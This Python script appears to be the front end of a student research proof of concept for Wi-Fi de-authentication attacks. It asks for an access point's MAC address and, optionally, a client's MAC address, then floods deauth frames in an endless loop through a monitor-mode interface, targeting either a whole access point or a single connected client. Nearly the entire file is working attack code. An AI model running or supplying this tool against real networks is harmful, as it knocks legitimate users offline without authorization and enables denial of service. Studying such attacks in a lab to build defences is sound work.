# import os
# import sys
from modules.deauth import *
from modules.scanning import *
import re
banner = """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║       ██║   ██║   ██║██║   ██║██║     
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║       ██║   ██║   ██║██║   ██║██║     
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                             
Group 162 - Research De-authentication attack & PoC
Group members: Tran Thi Thanh - Team leader👩‍💻
               Nguyen Minh Quang - super member
\nHappy Hecking :))
"""
interface = 'wlp5s0mon'
print(banner)

main_help = """
    How to use:
    Step 1. Get AP List, to get AP List please use the scanning module using this command \"python3 module/scanning.py\"
    Step 2. Get Station connected to AP using \"python3 module/scanning_client.py\"
    Step 3. Choose Attack Mode
"""

attack_mode_menu = """
    1. To AP
    2. To Client
    """
list_options = ['h', '1', '2']
options = input("[+] Enter your options (press h for help): ")
# print(list_options.find(options))


def is_mac_address(string):
    pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return pattern.match(string)


try:
    if options == 'h':
        print(main_help)
    elif options == '1':
        AP_MAC = input("[+] Enter AP MAC address (XX:XX:XX:XX:XX:XX): ")
        if is_mac_address(AP_MAC) == False:
            print("[X] Please re-enter correct AP MAC address !!")
        else:
            try:
                while True:
                    pkt = deauth_ap(AP_MAC)
                    sendp(pkt, iface = interface, count = 20, inter= .001)
            except KeyboardInterrupt:
                print("Bye")
    elif options == '2':
        AP_MAC1 = input("[+] Enter AP MAC address: ")
        client_mac = input("[+] Enter Client MAC address: ")
        if is_mac_address(AP_MAC1) == False:
            print("[X] Please re-enter correct AP MAC Address Format!! ")
        elif is_mac_address(client_mac) == False:
            print("[X] Please re-enter correct Client MAC Address Format!")
        elif is_mac_address(AP_MAC1) == False and is_mac_address(client_mac) == False:
            print("[X] Both MAC Address You Entered Is Invalid !")
        else:
            try:
                while True:
                    pkt = deauth_specific_victim(client_mac, AP_MAC1)
                    sendp(pkt, iface = interface, count = 20, inter= .001)
            except KeyboardInterrupt:
                print("Bye")
    else:
        print("Invalid Option !!")
except KeyboardInterrupt:
    print("Bye :))")

